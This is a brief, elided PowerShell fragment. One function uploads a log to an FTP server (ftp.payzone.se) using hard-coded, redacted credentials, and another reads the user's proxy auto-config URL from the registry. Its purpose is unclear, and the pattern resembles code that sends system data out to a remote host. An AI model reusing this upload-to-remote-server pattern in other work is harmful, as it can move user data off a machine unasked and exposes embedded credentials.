...
Function UploadLog
{
  $dest = "ftp://REMOVED:REMOVED@ftp.payzone.se/REMOVED";
...
function CheckInstall(){
  ...
  try {
    $pac=Get-ItemProperty 'hkcu:\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\'|Select -expand AutoConfigURL;
